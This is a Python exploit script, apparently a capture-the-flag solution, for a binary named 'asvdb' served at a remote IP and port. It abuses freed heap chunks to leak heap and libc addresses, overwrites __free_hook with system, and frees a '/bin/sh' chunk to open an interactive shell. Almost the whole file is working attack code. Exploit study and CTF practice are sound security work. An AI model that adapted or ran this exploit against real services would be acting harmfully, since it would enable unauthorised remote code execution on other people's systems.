#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import re

bin_file = './asvdb'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'37.139.17.37', 'port':1337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_free       = binf.got['free']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    db = ASVDB(conn)

    db.create(2018, 0, 'a'*8, 0x20, 'A'*8)
    db.create(2018, 1, 'b'*8, 0x20, 'B'*8)
    db.delete(1)
    db.delete(0)

    db.create(2018, 0, 'a'*8, 0x100)
    d = db.show(0)
    addr_heap_base = u(d['Description']) - 0x340
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    db.create(2018, 1, 'b'*8, 0x100)
    db.delete(0)

    dummy  = p32(3000)
    dummy += p32(0xff)
    dummy += p64(addr_got_main)
    dummy += p64(addr_got_main)
    db.create(2018, 0, 'a'*8, 0x20, dummy)

    d = db.show(1)
    addr_libc_main = u(d['title'])
    libc.address = addr_libc_main - offset_libc_main
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    db.create(2018, 2, 'c'*8, 0x8, 'C'*8)
    db.delete(2)
    db.create(2018, 2, 'c'*8, 0x100)
    db.delete(2)
    db.create(2018, 2, 'c'*8, 0x8, p64(addr_libc_free_hook))
    db.create(2018, 3, 'd'*8, 0x8, 'D'*8)
    db.create(2018, 4, '/bin/sh', 0x8, p64(addr_libc_system))
    db.delete(4)
    
class ASVDB:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.repatter       = re.compile('(.+): (.*)')

    def create(self, year, id, title, size, desc = None):
        self.sendlineafter('> ', '1')
        self.sendlineafter('year: ', str(year))
        self.sendlineafter('id: ', str(id))
        self.sendlineafter('chars): ', title)
        self.sendlineafter('size: ', str(size))
        if size < 0x100:
            self.sendlineafter('description: ', desc)
        self.sendlineafter(': ', '0')

    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('index: ', str(idx))

    def show(self, idx):
        self.sendlineafter('> ', '4')
        self.sendlineafter('index: ', str(idx))
        self.recvuntil('---\n')
        data = {}
        for x in self.repatter.finditer(self.recvuntil('\n---', drop = True)):
            data[x.group(1)] = x.group(2)
        return data

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
